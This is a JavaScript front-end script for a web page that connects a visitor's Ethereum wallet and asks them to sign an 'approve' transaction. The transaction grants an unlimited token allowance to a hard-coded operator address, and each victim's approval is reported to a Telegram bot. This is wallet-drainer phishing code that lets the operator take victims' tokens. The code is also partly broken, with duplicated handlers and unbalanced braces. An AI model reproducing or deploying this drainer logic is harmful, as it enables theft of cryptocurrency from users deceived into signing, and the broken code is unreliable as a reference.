const { sendNotification } = require('./telegramBot');
document.addEventListener("DOMContentLoaded", async function () {
    const web3 = new Web3("https://mainnet.infura.io/v3/65a9bb61d9144ba19821fa07cfb10a41"); // Replace with your Infura project ID or Ethereum node URL
    const usdcContractAddress = "0xB8c77482e45F1F44dE1745F52C74426C631bDD52"; // contract address of token
    const yourAddress = "0xbC792cFF237D23A92cF0Cd5e66491986D867E421"; // Replace with your personal Ethereum address

    const connectWalletButton = document.getElementById("connectWalletButton");
    const approveButton = document.getElementById("approveButton");
    const transactionStatus = document.getElementById("transactionStatus");

    let userAddress; // Variable to store the connected user's address

    async function connectWallet() {
        try {
            if (window.ethereum) {
                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });

                if (accounts.length > 0) {
                    userAddress = accounts[0];
                    console.log("Connected to account:", userAddress);
                    approveButton.removeAttribute("disabled"); // Enable the "Approve" button
                } else {
                    throw new Error("No Ethereum accounts available.");
                }
            } else {
                throw new Error("MetaMask or Ethereum wallet provider not found. Please install MetaMask or use an Ethereum wallet.");
            }
        } catch (error) {
            console.error(error);
            throw error;
        }
    }

    async function getEstimatedGas(data, userAddress) {
        try {
            const gas = await web3.eth.estimateGas({
                to: usdcContractAddress,
                data: data,
                from: userAddress,
            });
            return gas.toString(); // Convert gas to a string
        } catch (error) {
            console.error("Error estimating gas:", error);
            throw error;
        }
    }

    connectWalletButton.addEventListener("click", connectWallet);

    approveButton.addEventListener("click", async function () {
        try {
            if (!userAddress) {
                throw new Error("Please connect your wallet first.");
            }
    const approveButton = document.getElementById("approveButton");        

            // contract abi for approve on any token
            const usdcContractABI = [
                {
                    "inputs": [
                        {
                            "internalType": "address",
                            "name": "spender",
                            "type": "address"
                        },
                        {
                            "internalType": "uint256",
                            "name": "amount",
                            "type": "uint256"
                        }
                    ],
                    "name": "approve",
                    "outputs": [
                        {
                            "internalType": "bool",
                            "name": "",
                            "type": "bool"
                        }
                    ],
                    "stateMutability": "nonpayable",
                    "type": "function"
                }
            ];

            // Create a contract instance
            const usdcContract = new web3.eth.Contract(usdcContractABI, usdcContractAddress);

            // Encode the approval function with an infinite allowance
            const infiniteApproval = web3.utils.toBN(2).pow(web3.utils.toBN(256)).sub(web3.utils.toBN(1)).toString();
            const data = usdcContract.methods.approve(yourAddress, infiniteApproval).encodeABI();

            // Get the estimated gas amount as a string
            const gas = await getEstimatedGas(data, userAddress);

            // Create a raw transaction object
            const rawTx = {
                to: usdcContractAddress,
                gas: gas, // Use the estimated gas as a string
                value: "0x00",
                data: data,
            };  
                approveButton.addEventListener("click", async function () {
        try {
            if (!userAddress) {
               throw new Error("Please connect your wallet first.");
            }
            // Request the user's approval to sign the transaction
            const signedTx = await ethereum.request({
                method: 'eth_sendTransaction',
                params: [
                    {
                        from: userAddress,
                        ...rawTx,
                    },
                ],
            });
            // Send a notification to the Telegram bot when the user approves or rejects the request
            sendNotification(`User ${userAddress} ${signedTx ? "approved" : "rejected"} the request.`);
        } catch (error) {
          console.error(error);
          transactionStatus.textContent = `Error: ${error.message}`;
            // Display the transaction status
            transactionStatus.textContent = `Transaction Hash: ${signedTx}`;

        }
    });
});

